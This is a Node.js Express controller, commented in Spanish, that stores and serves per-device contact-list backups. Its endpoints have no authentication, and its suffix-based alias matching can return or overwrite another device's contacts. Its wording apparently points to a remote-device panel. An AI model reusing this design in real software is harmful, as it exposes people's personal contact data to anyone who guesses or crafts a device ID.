const fs = require('fs');
const path = require('path');
const { getDatasetDir, sanitizeDeviceId } = require('../utils/helpers');

// Helper de persistencia de rutas de contactos
const getContactsBackupPath = (safeDeviceId) => {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeDeviceId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  return path.join(deviceDir, 'contacts_backup.json');
};

const getContactsStatusPath = (safeDeviceId) => {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeDeviceId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  return path.join(deviceDir, 'contacts_status.json');
};

// POST Contacts Backup
const handleContactsBackup = (req, res) => {
  try {
    const headerDeviceId = req.headers['x-device-id'];
    const deviceIdParam = req.params.deviceId;
    const { deviceId, device_id, contacts, hash, timestamp, deviceModel } = req.body;
    const rawDeviceId = deviceIdParam || deviceId || device_id || headerDeviceId;

    if (!rawDeviceId || !Array.isArray(contacts)) {
      return res.status(400).json({ success: false, error: 'deviceId and contacts array are required' });
    }

    const safeDeviceId = sanitizeDeviceId(rawDeviceId);
    const backupRecord = {
      deviceId: safeDeviceId,
      rawDeviceId,
      deviceModel: deviceModel || 'Dispositivo Remoto',
      timestamp: timestamp || Date.now(),
      contactCount: contacts.length,
      hash: hash || '',
      contacts: contacts,
      updatedAt: new Date().toISOString()
    };

    fs.writeFileSync(getContactsBackupPath(safeDeviceId), JSON.stringify(backupRecord, null, 2), 'utf8');
    fs.writeFileSync(getContactsStatusPath(safeDeviceId), JSON.stringify({ status: 'ready', timestamp: Date.now() }, null, 2), 'utf8');

    // Sincronizar automaticamente con cualquier carpeta alias existente
    try {
      const targetDir = getDatasetDir();
      const devicesDir = path.join(targetDir, 'devices');
      if (fs.existsSync(devicesDir)) {
        const items = fs.readdirSync(devicesDir);
        for (const item of items) {
          if (item !== safeDeviceId && (item.endsWith(safeDeviceId) || safeDeviceId.endsWith(item))) {
            const aliasDir = path.join(devicesDir, item);
            if (fs.statSync(aliasDir).isDirectory()) {
              fs.writeFileSync(path.join(aliasDir, 'contacts_backup.json'), JSON.stringify(backupRecord, null, 2), 'utf8');
              fs.writeFileSync(path.join(aliasDir, 'contacts_status.json'), JSON.stringify({ status: 'ready', timestamp: Date.now() }, null, 2), 'utf8');
            }
          }
        }
      }
    } catch (e) {}

    console.log(`[CONTACTS_BACKUP] Saved ${contacts.length} contacts for device: ${safeDeviceId}`);
    return res.json({
      success: true,
      message: 'Respaldo de contactos guardado correctamente',
      deviceId: safeDeviceId,
      contactCount: contacts.length,
      hash: backupRecord.hash
    });
  } catch (err) {
    console.error('Error in handleContactsBackup:', err);
    return res.status(500).json({ success: false, error: 'Internal server error processing contacts backup' });
  }
};

// POST Contacts Status
const handleContactsStatus = (req, res) => {
  try {
    const headerDeviceId = req.headers['x-device-id'];
    const deviceIdParam = req.params.deviceId;
    const { deviceId, device_id, status, message } = req.body;
    const rawDeviceId = deviceIdParam || deviceId || device_id || headerDeviceId;

    if (!rawDeviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });
    const safeDeviceId = sanitizeDeviceId(rawDeviceId);

    fs.writeFileSync(getContactsStatusPath(safeDeviceId), JSON.stringify({
      status: status || 'syncing',
      message: message || 'Sincronizando libreta de contactos...',
      timestamp: Date.now()
    }, null, 2), 'utf8');

    return res.json({ success: true, status: status || 'syncing' });
  } catch (err) {
    console.error('Error in handleContactsStatus:', err);
    return res.status(500).json({ success: false, error: 'Internal server error updating contacts status' });
  }
};

// GET Contacts Backup
const handleGetContacts = (req, res) => {
  try {
    const rawDeviceId = req.params.deviceId || req.query.deviceId || req.headers['x-device-id'];
    if (!rawDeviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });

    const safeDeviceId = sanitizeDeviceId(rawDeviceId);
    const backupPath = getContactsBackupPath(safeDeviceId);

    if (fs.existsSync(backupPath)) {
      try {
        const backupData = JSON.parse(fs.readFileSync(backupPath, 'utf8'));
        return res.json({ success: true, status: 'ready', ...backupData });
      } catch (e) {}
    }

    // Fallback de alias estricto
    const targetDir = getDatasetDir();
    const devicesDir = path.join(targetDir, 'devices');
    if (fs.existsSync(devicesDir)) {
      const items = fs.readdirSync(devicesDir);
      for (const item of items) {
        if (item !== safeDeviceId && (item.endsWith(safeDeviceId) || safeDeviceId.endsWith(item))) {
          const altBackupPath = path.join(devicesDir, item, 'contacts_backup.json');
          if (fs.existsSync(altBackupPath)) {
            try {
              const backupData = JSON.parse(fs.readFileSync(altBackupPath, 'utf8'));
              return res.json({ success: true, status: 'ready', ...backupData });
            } catch (e) {}
          }
        }
      }
    }

    const statusPath = getContactsStatusPath(safeDeviceId);
    if (fs.existsSync(statusPath)) {
      try {
        const statusData = JSON.parse(fs.readFileSync(statusPath, 'utf8'));
        if (statusData && statusData.status === 'syncing') {
          return res.json({ success: true, status: 'syncing', message: statusData.message });
        }
      } catch (e) {}
    }

    return res.status(404).json({ success: false, status: 'not_installed', error: `No backup found for device ${rawDeviceId}`, deviceId: safeDeviceId });
  } catch (err) {
    console.error('Error in handleGetContacts:', err);
    return res.status(500).json({ success: false, error: 'Internal server error reading contacts' });
  }
};

module.exports = {
  handleContactsBackup,
  handleContactsStatus,
  handleGetContacts
};
